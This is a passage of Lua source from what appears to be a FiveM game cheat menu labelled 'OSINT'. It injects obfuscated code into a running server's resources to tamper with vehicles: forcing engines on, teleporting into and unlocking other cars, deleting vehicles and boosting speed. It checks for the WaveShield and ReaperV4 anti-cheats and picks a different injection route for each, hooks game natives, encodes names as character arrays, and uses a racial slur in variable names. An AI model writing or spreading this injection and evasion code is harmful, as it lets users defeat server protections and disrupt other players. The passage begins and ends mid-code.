                                            local function xKqLZVwPt9()
                                                local XcVbNmAsDfGhJkL = PlayerPedId
                                                local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                                                local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                                                local pEd = XcVbNmAsDfGhJkL()
                                                local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                                                if vEh and vEh ~= 0 then
                                                    PoIuYtReWqAzXsDc(vEh, "%s")
                                                end
                                            end

                                            xKqLZVwPt9()
                                        ]], val)

                                        MachoInjectResourceRaw("any", injectedCode)
                                    else
                                        OSINT:Notify("Invalid input", "Please enter a valid license plate.", "error")
                                    end
                                end, "typeable")
                            end
                        },
                        { type = "button", label = "Repair Vehicle",
                            onSelect = function()
                                self:RepairVehicle()
                            end
                        },
                        { type = "button", label = "Clean Vehicle",
                            onSelect = function()
                            OSINT:Notify("success", "OSINT", "Cleaned Vehicle", 3000)
                            MachoInjectResourceRaw("any", [[
                            local function qPwRYKz7mL()
                                local a = PlayerPedId
                                local b = GetVehiclePedIsIn
                                local c = SetVehicleDirtLevel

                                local ped = a()
                                local veh = b(ped, false)
                                if veh and veh ~= 0 then
                                    c(veh, 0.0)
                                end
                            end

                            qPwRYKz7mL()
                            ]])
                            end
                        },
                        { type = "button", label = "Force Vehicle Engine",
                            onSelect = function()
                            Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return false end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return false end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                                GhYtReFdCxWaQzLp = true

                                local function OpAsDfGhJkLzXcVb()
                                    local lMnbVcXzZaSdFg = CreateThread
                                    lMnbVcXzZaSdFg(function()
                                        local QwErTyUiOp         = _G.PlayerPedId
                                        local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                                        local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                                        local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                                        local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                                        local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                                        local En_g_Health_Get    = _G.GetVehicleEngineHealth
                                        local En_g_Health_Set    = _G.SetVehicleEngineHealth
                                        local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                                        local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                                        local function _tick(vh)
                                            if vh and vh ~= 0 then
                                                No_Hotwire_Set(vh, false)
                                                En_g_Degrade_Set(vh, false)
                                                ErTyUiOpAsDfGh(vh, false)
                                                KeEpOnAb(vh, true)

                                                local eh = En_g_Health_Get(vh)
                                                if (not eh) or eh < 300.0 then
                                                    En_g_Health_Set(vh, 900.0)
                                                end

                                                ZxCvBnMqWeRtYu(vh, true, true, true)
                                            end
                                        end

                                        while GhYtReFdCxWaQzLp and not Unloaded do
                                            local p  = QwErTyUiOp()

                                            _tick(AsDfGhJkLz(p, false))
                                            _tick(TyUiOpAsDfGh(p))
                                            _tick(AsDfGhJkLz(p, true))

                                            Wait(0)
                                        end
                                    end)
                                end

                                OpAsDfGhJkLzXcVb()
                            ]])
                        end, function()
                            Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                GhYtReFdCxWaQzLp = false
                                local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                if v and v ~= 0 then
                                    SetVehicleKeepEngineOnWhenAbandoned(v, false)
                                    SetVehicleEngineCanDegrade(v, true)
                                    SetVehicleUndriveable(v, false)
                                end
                            ]])
                            end
                        },
                        { type = "button", label = "Max Upgrade",
                            onSelect = function()
                            OSINT:Notify("success", "OSINT", "Vehicle Max Upgraded", 3000)
                            local WaveNiggaStarted = GetResourceState("WaveShield") == 'started'
                            local ReaperNiggaStarted = GetResourceState("ReaperV4") == 'started'
                            if WaveNiggaStarted then
                            print("WaveNiggaStarted")
                            MachoInjectResourceRaw("any", [[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]])
                            elseif ReaperNiggaStarted then
                            print("using Reaper fallback")
                            MachoInjectThread(0, "any", "", [[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]])
                        else
                            MachoInjectResourceRaw("any", [[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]])
                            end
                        end
                        },
                        { type = "button", label = "Delete Vehicle",
                            onSelect = function()
                            OSINT:Notify("success", "OSINT", "Deleted Vehicle", 3000)
                            MachoInjectResourceRaw("any", [[
                            local function LXpTqWvR80()
                                local aQw = PlayerPedId
                                local bEr = GetVehiclePedIsIn
                                local cTy = DoesEntityExist
                                local dUi = NetworkHasControlOfEntity
                                local eOp = SetEntityAsMissionEntity
                                local fAs = DeleteEntity
                                local gDf = DeleteVehicle
                                local hJk = SetVehicleHasBeenOwnedByPlayer

                                local ped = aQw()
                                local veh = bEr(ped, false)

                                if veh and veh ~= 0 and cTy(veh) then
                                    hJk(veh, true)
                                    eOp(veh, true, true)

                                    if dUi(veh) then
                                        fAs(veh)
                                        gDf(veh)
                                    end
                                end

                            end

                            LXpTqWvR80()
                            ]])
                            end
                        },
                        { type = "button", label = "Unlock Closest Vehicle",
                            onSelect = function()
                            OSINT:Notify("success", "OSINT", "Deleted Vehicle", 3000)
                            MachoInjectResourceRaw("any", [[
                            local function TpLMqKtXwZ()
                                local AsoYuTrBnMvCxZaQw = PlayerPedId
                                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                                local ped = AsoYuTrBnMvCxZaQw()
                                local coords = GhrTnLpKjUyVbMnZx(ped)
                                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                                    VczNmLoJhBgVfCdEx(veh, true, true)
                                    RtYuIoPlMnBvCxZaSd(veh, true)
                                    EqWoXyBkVsNzQuH(veh, 1)
                                    YxZwQvTrBnMaSdFgHj(veh, false)
                                end

                            end

                            TpLMqKtXwZ()
                            ]])
                            end
                        },
                        { type = "button", label = "Teleport into Closest Vehicle",
                            onSelect = function()
                            OSINT:Notify("success", "OSINT", "Teleported into Vehicle", 3000)
                            MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            local function uPKcoBaEHmnK()
                                local ziCFzHyzxaLX = SetPedIntoVehicle
                                local YPPvDlOGBghA = GetClosestVehicle

                                local Coords = GetEntityCoords(PlayerPedId())
                                local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                                if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                                    if GetPedInVehicleSeat(vehicle, -1) == 0 then
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                                    else
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                                    end
                                end
                            end

                            uPKcoBaEHmnK()
                            ]])
                            end
                        },
                        { type = "divider", label = "Toggles" },
                        {
                            type = "checkbox",
                            label = "Boost Vehicle",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    OSINT:Notify("success", "OSINT", "Boost Vehicle On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("WaveShield") == "started" and "WaveShield" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superSpeedBoost then
                                                _G.superSpeedBoost = true

                                                local PlayerPedId_fn       = g({80,108,97,121,101,114,80,101,100,73,100})
                                                local GetVehiclePedIsIn_fn = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})
                                                local IsPedInAnyVehicle_fn = g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})
                                                local IsControlPressed_fn  = g({73,115,67,111,110,116,114,111,108,80,114,101,115,115,101,100})
                                                local SetVehicleForwardSpeed_fn = g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})
                                                local Wait_fn              = g({87,97,105,116})

                                                _G.superSpeedBoostEnabled = true

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[SuperSpeedBoost] Coroutine error: ^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.superSpeedBoostEnabled do
                                                        if not _G.superSpeedBoostEnabled then break end

                                                        local ped = PlayerPedId_fn()
                                                        if IsControlPressed_fn(0, 209) and IsPedInAnyVehicle_fn(ped, false) then
                                                            local veh = GetVehiclePedIsIn_fn(ped, false)
                                                            if veh and veh ~= 0 then
                                                                SetVehicleForwardSpeed_fn(veh, 100.0)
                                                            end
                                                        end

                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            if VbNmQwErTyUi == nil then
                                                VbNmQwErTyUi = true

                                                local function YgT7FrqXcN()
                                                    local ZxSeRtYhUiOp = CreateThread
                                                    local LkJhGfDsAzXv = PlayerPedId
                                                    local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                    local ErTyUiOpAsDf = IsControlPressed
                                                    local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                    local HnJmKlIoPuYt = SetVehicleForwardSpeed

                                                    ZxSeRtYhUiOp(function()
                                                        while true do
                                                            Wait(0)
                                                            if not VkLpOiUyTrEq then
                                                                Wait(500)
                                                                goto continue
                                                            end

                                                            local ped = LkJhGfDsAzXv()
                                                            if ErTyUiOpAsDf(0, 209) and GtHyJuKoLpMi(ped, false) then
                                                                local veh = PoLkJhBgVfCd(ped, false)
                                                                if veh and veh ~= 0 then
                                                                    HnJmKlIoPuYt(veh, 100.0)
                                                                end
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                YgT7FrqXcN()
                                            end
                                            
                                            VkLpOiUyTrEq = true
                                        ]])
                                    end
                                else
                                    OSINT:Notify("error", "OSINT", "Boost Vehicle Off", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            _G.superSpeedBoost = false
                                        ]])
                                    else
                                        Injection("any", [[
                                            VkLpOiUyTrEq = false
                                        ]])
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Instant Brakes",
                            checked = false,
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    if waveStarted then
                                        OSINT:Notify("success", "OSINT", "Instant Brakes On", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return PlayerPedId() end
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                while VkLpOiUyTrEq and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                            VbNmQwErTyUi(veh, 0.0)
                                                        end
                                                    end
                                                    ::continue::
                                                end

                                                -- Restore on disable
                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        -- No need to restore speed, just stop forcing 0
                                                    end
                                                end
                                            end)
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsDisabledControlPressed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function YgT7FrqXcN()
                                                local ZxSeRtYhUiOp = CreateThread
                                                local LkJhGfDsAzXv = PlayerPedId
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                ZxSeRtYhUiOp(function()
                                                    while VkLpOiUyTrEq and not Unloaded do
                                                        local ped = LkJhGfDsAzXv()
                                                        local veh = PoLkJhBgVfCd(ped, false)
                                                        if veh and veh ~= 0 then
                                                            if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                                VbNmQwErTyUi(veh, 0.0)
                                                            end
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            YgT7FrqXcN()
                                        ]])
                                        OSINT:Notify("success", "OSINT", "Instant Brakes On (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then
                                        OSINT:Notify("success", "OSINT", "Instant Brakes Off", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", [[
                                            VkLpOiUyTrEq = false
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            VkLpOiUyTrEq = false
                                        ]])
                                        OSINT:Notify("success", "OSINT", "Instant Brakes Off (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Easy Handling",
                            checked = false,
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                            or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                            or "any"

                                if checked then
                                    if waveStarted then
                                        OSINT:Notify("success", "OSINT", "Easy Handling On", 3000)
                                        MachoInjectResourceRaw("WaveShield", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return GetPlayerPed(-1) end
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                while NvGhJkLpOiUy and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 73.0)
                                                        PlMnBvCxZaSd(veh, true)
                                                    end
                                                    ::continue::
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end
                                            end)
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
